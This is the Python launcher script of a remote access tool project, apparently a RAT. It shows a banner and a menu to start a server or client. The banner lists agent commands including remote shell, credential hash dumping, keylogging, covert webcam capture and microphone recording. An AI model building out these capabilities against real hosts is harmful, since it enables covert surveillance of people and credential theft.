"""
RAT Project - Main entry point.

Displays the startup banner and lets the user choose
between starting the server or the client.
"""

import os
import sys

# Color #605794 = RGB(96, 87, 148) as ANSI truecolor
COLOR = "\033[38;2;96;87;148m"
RESET = "\033[0m"

SEP = "=" * 155

WELCOME_TITLE = "Welcome to RAT Control Center.".center(155)
COMMANDS_TITLE = "AVAILABLE COMMANDS".center(155)

BANNER = f"""
@@@@@@@   @@@@@@@@  @@@@@@@@@@    @@@@@@   @@@@@@@  @@@@@@@@      @@@@@@   @@@@@@@   @@@@@@@@@@   @@@  @@@  @@@     @@@@@@@   @@@@@@    @@@@@@   @@@
@@@@@@@@  @@@@@@@@  @@@@@@@@@@@  @@@@@@@@  @@@@@@@  @@@@@@@@     @@@@@@@@  @@@@@@@@  @@@@@@@@@@@  @@@  @@@@ @@@     @@@@@@@  @@@@@@@@  @@@@@@@@  @@@
@@!  @@@  @@!       @@! @@! @@!  @@!  @@@    @@!    @@!          @@!  @@@  @@!  @@@  @@! @@! @@!  @@!  @@!@!@@@       @@!    @@!  @@@  @@!  @@@  @@!
!@!  @!@  !@!       !@! !@! !@!  !@!  @!@    !@!    !@!          !@!  @!@  !@!  @!@  !@! !@! !@!  !@!  !@!!@!@!       !@!    !@!  @!@  !@!  @!@  !@!
@!@!!@!   @!!!:!    @!! !!@ @!@  @!@  !@!    @!!    @!!!:!       @!@!@!@!  @!@  !@!  @!! !!@ @!@  !!@  @!@ !!@!       @!!    @!@  !@!  @!@  !@!  @!!
!!@!@!    !!!!!:    !@!   ! !@!  !@!  !!!    !!!    !!!!!:       !!!@!!!!  !@!  !!!  !@!   ! !@!  !!!  !@!  !!!       !!!    !@!  !!!  !@!  !!!  !!!
!!: :!!   !!:       !!:     !!:  !!:  !!!    !!:    !!:          !!:  !!!  !!:  !!!  !!:     !!:  !!:  !!:  !!!       !!:    !!:  !!!  !!:  !!!  !!:
:!:  !:!  :!:       :!:     :!:  :!:  !:!    :!:    :!:          :!:  !:!  :!:  !:!  :!:     :!:  :!:  :!:  !:!       :!:    :!:  !:!  :!:  !:!   :!:
::   :::   :: ::::  :::     ::   ::::: ::     ::     :: ::::     ::   :::   :::: ::  :::     ::    ::   ::   ::        ::    ::::: ::  ::::: ::   :: ::::
 :   : :  : :: ::    :      :     : :  :      :     : :: ::       :   : :  :: :  :    :      :    :    ::    :         :      : :  :    : :  :   : :: : :


{SEP}
{WELCOME_TITLE}
{SEP}

[*] Listening on TCP/8888...
[*] Secure channel: ENABLED
[*] Multi-agent mode: READY
[*] Type 'help' to list available commands.

rat > help

{SEP}
{COMMANDS_TITLE}
{SEP}

General:
  help                     Show available commands
  clear                    Clear terminal
  banner                   Show startup banner
  status                   Show server status
  sessions                 List connected agents
  interact <agent_id>      Open interactive prompt for one agent
  disconnect <agent_id>    Close selected session
  exit                     Stop server console

Agent Commands:
  download                 Retrieve file from remote host
  upload                   Send file to remote host
  shell                    Open interactive system shell
  ipconfig                 Show network configuration
  screenshot               Capture remote screen
  search                   Search file on remote host
  hashdump                 Dump system credential database
  keylogger                Start/stop keystroke capture
  webcam_snapshot          Take webcam picture
  webcam_stream            Start live webcam stream
  record_audio             Record microphone audio

{SEP}
"""


def _c(text: str) -> str:
    """Wrap text with the project color."""
    return f"{COLOR}{text}{RESET}"


def main() -> None:
    """Entry point for the 'rat' command."""
    # Enable ANSI colors on Windows
    if os.name == "nt":
        os.system("")

    print(_c(BANNER))

    while True:
        print(_c("  [1]  Start server"))
        print(_c("  [2]  Start client"))
        print(_c("  [3]  Exit"))
        print()

        choice = input(_c("rat > ")).strip()

        if choice == "1":
            from rat_project.server.server_app import run_server

            run_server()
            break

        elif choice == "2":
            from rat_project.client.client_app import run_client

            run_client()
            break

        elif choice == "3":
            print(_c("[*] Goodbye."))
            sys.exit(0)

        else:
            print(_c("[!] Invalid choice. Please enter 1, 2 or 3."))
            print()


if __name__ == "__main__":
    main()
